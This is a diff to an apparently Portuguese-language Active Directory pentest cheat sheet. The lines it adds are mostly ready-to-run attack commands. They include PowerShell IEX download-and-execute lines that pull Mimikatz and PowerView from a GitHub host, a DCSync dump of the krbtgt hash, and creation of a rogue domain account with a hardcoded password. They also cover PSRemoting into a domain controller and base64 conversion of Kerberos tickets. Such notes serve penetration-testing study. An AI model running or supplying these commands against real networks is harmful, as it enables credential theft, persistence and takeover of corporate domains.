@@ -1363,11 +1363,24 @@ CARREGAR O MIMIKATZ E FAZER O DCSYNC:
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
 Invoke-Mimikatz
 ```
-FAZER O ATAQUE DCSYNC
+OPÇÃO 1 - FAZER O ATAQUE DCSYNC
 ```
 lsadump::dcsync /user:tech\krbtgt
 ```
-
+OPÇÃO 2 - CRIAR UMA CONTA NO DOMINIO
+```
+$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String 123qwe..
+New-ADUser -Name "pentester" -Description "Pentester User" -Enabled $true -AccountPassword $PASSWORD
+```
+OPÇÃO 3 - ACESSAR REMOTAMENTE DIA PSREMOTE
+```
+Enter-Pssession -computername tech-dc01
+```
+OPÇÃO 4 - VERIFICAR ONDE SOU ADMINISTRADOR LOCAL
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
+FIND-LOCALADMINACCESS
+```
 ##### UNCONSTRAINED DELEGATION RUBEUS - CONVERTER TICKET DO RUBEUS BASE64 PARA MIMIKATZ KIRBI
 ```
 [IO.File]::WriteAllBytes("C:\ticket.kirbi", [Convert]::FromBase64String("doIFqjCCBaRFQ0guTE9DQUw="))
@@ -1379,6 +1392,10 @@ kerberos::ptt ticket.kirbi
 ```
 ```
 lsadump::dcsync /user:tech\krbtgt
+```
+##### UNCONSTRAINED DELEGATION RUBEUS - CONVERTER TICKET KIRBI PARA BASE64 (SÓ PRA CONSTAR E FICAR JUNTO)
+```
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\ticket.kirbi")); 
 ```
 
 
